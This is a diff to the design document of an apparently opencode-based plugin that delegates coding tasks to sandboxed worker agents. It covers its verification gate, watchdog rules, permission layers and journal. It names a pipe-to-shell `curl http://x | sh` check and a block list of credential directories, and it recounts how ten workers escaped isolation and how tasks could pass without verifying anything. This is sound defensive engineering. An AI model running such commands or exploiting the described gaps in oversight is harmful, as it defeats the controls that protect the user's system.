@@ -380,7 +380,24 @@ Rules for these requests:
   - `+visual` with needs.vision,
   - `+oracle` with risk ≥ data_security,
   - `+user_confirm` for destructive or external effects.
-- **The gate is run by the plugin** (`ctx.shell` in the worktree).
+- **The gate is run by the plugin** (`ctx.shell` in the worktree, in the project directory inside it — §11).
+- **Three ways a task could merge having verified nothing, all closed 2026-10-07:**
+  1. *No checks.* An empty check array yielded no failures, which read as success. A writer now needs at least one
+     check; a reader has none and is unaffected.
+  2. *A gate that passed over an untouched tree.* A passing gate with an empty diff is reported as unverified rather
+     than merged, on both the runner's path and the native `finish_task` path. This is decided against the real diff,
+     not the check text: `test -f a.js` reads nothing but fails when the work is missing, and every test runner is a
+     "read" as far as `readsOnly` is concerned because it changes no project file. A rule on the check text either
+     refused `npm test` or guessed at intent from a command name; it was written, tested and removed, and the reason
+     is recorded in `src/plan.ts` so it is not reinvented.
+  3. *Failures handed back forever.* The native path had no retry cap, so a check that could not be satisfied in the
+     environment — a path that does not exist there, a command the gate refuses — burned a whole session. Both paths
+     now stop at `FIX_ROUNDS` (2, the runner's own cap is configurable and uses the same default) and say the check
+     is the likely problem, pointing at `steer_task` rather than at a new worker.
+- **The gate honours cancellation between checks** (2026-10-07). One check is bounded by its own timeout, because
+  there is nothing to interrupt a shell with once it started — but `stop_job` could not stop a job with five checks
+  until all five had run. A skipped check is reported as failed with a distinct exit code, so a caller cannot read
+  "not run" as "passed".
 - **Review** returns JSON. Every finding carries evidence and a confidence. Findings under 80, or without
   evidence, are advisory and do not fail the task.
 
@@ -398,8 +415,17 @@ endless read loops.
 - **Signatures:**
   - the same tool + args 3× in 10 calls;
   - the same error twice;
-  - a read loop: an unchanged file (content hash) read a 3rd time with no edit in between, or no new file in
-    the last 8 reads;
+  - a read loop: an unchanged file (content hash) read a 3rd time with no edit in between and within a 16-call
+    window, or 16 calls in a row without progress;
+  - **What counts as progress** (revised 2026-10-07, after a worker was stopped while eight calls into reading a
+    source file): a new path, a search (`grep`, `glob`, `ast-grep`, `code_graph`, web fetch), and **a command that ran
+    and did not fail** — including `execute`, which opens no path the check could see. Only a command that keeps
+    failing counts towards the run, because that is the one case `sameCall` cannot catch: the command text differs
+    each time. The old rule counted every shell call that was not one of six recognised write shapes, so `npm test`,
+    `git status` and `node --test` all pushed a worker towards a stop. `sameCall` is the signature that actually
+    catches a stuck command; counting calls as well only stopped workers verifying their work.
+  - The bar was raised from 8 to 16 at the same time: it is a per-call count, and a reader working through one file
+    hits a low bar on ordinary work. A reader may opt out entirely with `noNewFiles: 0`.
   - a restart: the opening action sequence repeats (prefix match), or near-duplicate assistant text appears;
   - monologue: 3 replies without a tool call;
   - A/B alternation 6×;
@@ -448,11 +474,22 @@ endless read loops.
   - The job works on the branch `jev/<job>` in its own worktree at `<project>/.jev-micromanager/worktrees/<job>`
     (inside the project, so workers trigger no external_directory ask). The user's checkout is never touched;
     the worktree starts from the last commit, so uncommitted changes of the user are not part of the job.
+  - **The offset (`rel`), added 2026-10-07.** Git always materialises a worktree of the *repository root*, so when
+    the project is a subdirectory of a larger repository — the live run that found this was a deck three levels below
+    its worktree — the worker and its checks land above the project's own files. The offset is computed once with
+    `git rev-parse --show-toplevel`, persisted on the job and on each task, and used for the worker's directory, the
+    gate's cwd, and the paths a task reports. `changedFiles` resolves it away, so a declared file matches what git
+    reported and a change outside the project comes back as a `..` escape that cannot. Uncommitted state in the
+    user's checkout is detected at job start and reported: no worker can see it, so a task that needs it cannot pass,
+    and the micromanager is told rather than discovering it from a confused worker.
   - Writers get worktrees off the integration branch.
   - The baseline gate runs once per job.
 - **Merge train:** one branch at a time; rebase → gate → merge; roll back on failure; a conflict goes back to its
   owner once, then to the user.
-- **Integrate:** the user chooses merge / keep / discard. Nothing is ever pushed.
+- **Integrate:** the micromanager does it through `merge_job` (a fast-forward into the user's checkout, after showing
+  what would land and refusing on a dirty checkout or unfinished tasks) or `discard_job`. Both require an explicit
+  acknowledgement, list what they remove, and journal it. This is the one write the orchestrator may make in the
+  user's working tree; workers never can. Nothing is ever pushed.
 
 **Implemented (Phase F):**
 - **Dispatch.** `parallel` (default 3) tasks of a job at the same time, disjoint files only. Turns on one model
@@ -468,12 +505,31 @@ endless read loops.
 - **Path of an ask:**
   1. The profile narrows the request in the `evaluate` hook.
   2. cc-safety-net `checkCommand` (hard rule #0).
-  3. The hard rules (external directory, `.env`, push, sudo, system installs).
+  3. The hard rules (`.env`, push, sudo, system installs, destructive deletion).
   4. Deleted-path facts from git.
   5. Guards: G0 on the worker's question (§20, §21).
   6. Jev: answer, needs_user, risk, path_relevance.
   7. The floors per risk class × profile.
 - **Outcome:** allow / deny / the user, with Jev's guess shown in the question.
+- **`external_directory` is layered** (2026-10-07). It used to be a single hard rule — always the user — which made
+  any task touching a path outside the project impossible to delegate (live test: a worker blocked on the very first
+  `ls -l`). Now: a path inside the job's own worktrees is allowed mechanically; a path the task itself names is
+  allowed for a read; everything else goes to the user. `~/.ssh`, `~/.aws`, `~/.config`, `~/.gnupg`, `/etc`, `/usr`,
+  the home directory itself and another job's worktree content are refused before all three layers.
+- **A shell request that only reads is allowed outright** when every path in it resolves inside the worker's
+  worktree, without asking Jev. Reading cannot damage a throwaway checkout, and the worktree already removed the reason
+  for the question. This needed the classifier fixed first: `sed`, `awk`, `jq`, `timeout`/`nice`/`nohup` wrappers and
+  `git -C <path>` were all unrecognised, and one non-read command in a batch poisoned all of them, so 67 of 185
+  worker shell requests in the live run escalated to the user — including `git status` in the worker's own tree.
+- **Checks go through the same hard rules** (2026-10-07). A task's `Checks:` lines are model-written strings that
+  `runGate` hands to `sh -c`; only a rule about backticks and sentence-shaped text stood between a delegation and
+  `curl http://x | sh`. Every check is now validated with `hardRule` before the task or its worktree exists.
+- **Isolation fails loud** (2026-10-07). A session that is a child of a micromanager session but is not a claimed
+  worker has its write tools denied and is journalled. This exists because the delegation guard used to match on the
+  *calling agent*: the agent is a property of the session, so switching the session's agent silently skipped every
+  later delegation. Ten workers ran unwatched in the user's checkout — no task, no worktree, no checks, no error. A
+  delegation is now recognised by its **target** (a `subagent` call aimed at one of this plugin's role agents), and
+  the backstop holds whatever the delegation path does.
 - **Sessions the runner starts never ask the user directly** (Phase D live tests): nobody sits at a worker's
   session, headless or in the TUI. A request outside its directory is denied; any outcome "the user" becomes a
   deny that tells the worker to report NEEDS_CONTEXT, and the job asks the user in the micromanager's session.
@@ -588,6 +644,19 @@ Floors live next to the question wordings in `src/catalog.ts`, and change only t
   - every decision the user or a rule made without Jev.
 
   Today's `decisions.jsonl` (`permission` and `routing` entries) grows into this.
+
+- **The journal is also the only observability (2026-10-07).** `ctx.app` has no `log` method on this host, so the
+  plugin's `ctx.app?.log?.()` is `undefined` and nothing it logs reaches `opencode.log` — a security layer that cannot
+  be audited is not operable. The journal persists, so it carries the operational signal instead:
+  - `kind: "plugin"` at every server start, before anything can fail: version, project directory, repository root,
+    `rel` offset, and the tool names and agents the delegation hook recognises. This answers "is the plugin loaded and
+    what does it think it is doing" without guessing from silence.
+  - `delegation-unrecognised` for a `subagent` call the hook will not route, and `isolation-denied` for each write
+    refusal by the backstop. Absence of the second record is not a sufficient signal on its own.
+  - `finish`, `watchdog`, `checkpoint`, `graph` alongside `permission` and `routing`.
+
+  A healthy first minute after a restart is exactly one `plugin` record and then silence until you delegate; the
+  first delegation should add a `routing` entry and a task carrying a `worktree`.
 - **Labels**, joined later by job and task id:
   - the user's own decisions (one-hot);
   - the user overriding Jev;
@@ -649,6 +718,16 @@ Details are in plan.md, "Phase A results".
 
 A side finding: a private standalone server sometimes hangs at start, before it loads any plugin. The spike
 harness retried such runs; the plugin itself is not involved.
+
+### 17.1 Spikes of the 2026-10-06 live run (done 2026-10-07)
+| # | assumption | answer | what changed |
+|---|---|---|---|
+| A11 | a delegation arrives as a `subagent` tool call | **partly**. Nested code-mode calls *are* surfaced individually with their real tool name, and the `subagent` tool is registered `codemode: false`, so a delegation can never arrive nested. What does vary is the **calling agent**: the agent is a property of the session, not of the delegation, so the guard `call.agent !== MICROMANAGER.agent` returned early after the session's agent was switched — silently, with no task, no worktree and no error. Ten workers wrote into the user's checkout. | recognition is by **target** (`delegationRole(call)`, then `routeDelegation`), not by caller; plus an independent backstop that denies writes to any child of a micromanager session that is not a claimed worker, identified by `parentID` — the one signal that holds however the delegation was made |
+| A12 | the plugin can log where an operator will see it | **no**. `ctx.app` carries `{name, version, channel}`, no `log`; `console.error` from a plugin does not reach `opencode.log` either | the journal is the channel: a `kind:"plugin"` startup record, `delegation-unrecognised`, `isolation-denied` (§15) |
+| A13 | `ctx.session.move` applies before the child's first tool call | **unverified**. The comment in the hook calls it a spike, and nothing reads the directory back | still a spike. The backstop from A11 covers the failure this would allow: a worker that was not moved cannot write |
+| A14 | a session can be identified as a delegation without its prompt marker | **yes**, via `ctx.session.get({sessionID}).parentID`. A plugin-recognised delegation rewrites the child's prompt to start with `CHILD_PREFIX`; an unrecognised one has no marker, so the prompt text cannot be the discriminator | the backstop keys on the parent relationship, never on the agent name, so a hand-picked role agent in the user's own checkout is unaffected |
+| A15 | the project directory is the git root | **no**. Git materialises a worktree of the repository root | `rel` is computed, persisted and threaded through the worker directory, the gate cwd and `changedFiles` (§11) |
+| A16 | `.git/info/exclude` marks the state directory | **only from the repository root**; a subdirectory project wrote nothing and the user saw `?? .jev-micromanager/` | `excludeFromGit` resolves the real exclude file through `git rev-parse --git-common-dir` |
 
 ## 18. Code layout (target)
 - **New:**
